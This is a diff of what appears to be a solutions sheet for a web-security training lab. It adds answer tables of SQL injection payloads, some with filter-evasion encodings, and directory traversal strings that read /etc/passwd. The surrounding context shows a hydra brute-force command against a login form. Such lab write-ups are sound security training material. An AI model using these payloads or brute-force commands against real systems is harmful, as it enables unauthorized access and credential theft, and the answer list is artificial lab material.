@@ -31,3 +31,22 @@ hydra -P /usr/shared/wordlists/rockyou.txt
 	  -l admin
 	  10.0.4.5 http-post-form "/login:username=^USER^:password=^PASS^:submit=Login:F=Invalid username"
 	  -f
+
+## SQL Injection
+| excercise | solution |
+|-----------|----------|
+| example&nbsp;1 | root'+OR+'1'='1, `root'OR+1=1+--` |
+| example&nbsp;2 | root'%09OR'1'='1 |
+| example&nbsp;3 | root'/**/OR/**/'1'='1 |
+| example&nbsp;4 | 2+OR+1=1 |
+| example&nbsp;5 | 2+OR+1=1#123 |
+| example&nbsp;6 | 2+OR+1=1#123 |
+| example&nbsp;7 | 2%0AOR+1=1# |
+| example&nbsp;8 | name\`,IF((SELECT+0x61)=0x61%2Cid%2Cage)+%23 |
+| example&nbsp;9 | IF((SELECT+0x61)=0x61%2Cid%2Cage), `IF((SELECT'a')='a',id,age)` |
+
+## Directory Traversal
+| excercise | solution |
+|-----------|----------|
+| example&nbsp;1 | ../../../../../../../../../etc/passwd |
+| example&nbsp;2 | /var/www/files/../../../../../../etc/passwd |
